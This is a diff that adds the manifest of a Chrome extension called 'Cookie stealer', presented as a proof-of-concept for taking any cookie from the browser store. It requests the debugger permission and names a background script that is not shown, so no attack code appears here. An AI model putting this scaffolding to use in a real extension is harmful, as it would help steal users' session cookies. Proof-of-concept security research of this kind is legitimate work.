@@ -1,0 +1,13 @@
+{
+    "manifest_version": 3,
+    "name": "Cookie stealer",
+    "description": "Proof-of-Concept extension for stealing any entry from the browser cookie store",
+    "version": "0.0.1",
+    "permissions": [
+        "tabs", // Only needed to open a new tab (for demo purposes)
+        "debugger"
+    ],
+    "background": {
+        "service_worker": "background.js"
+    }
+}
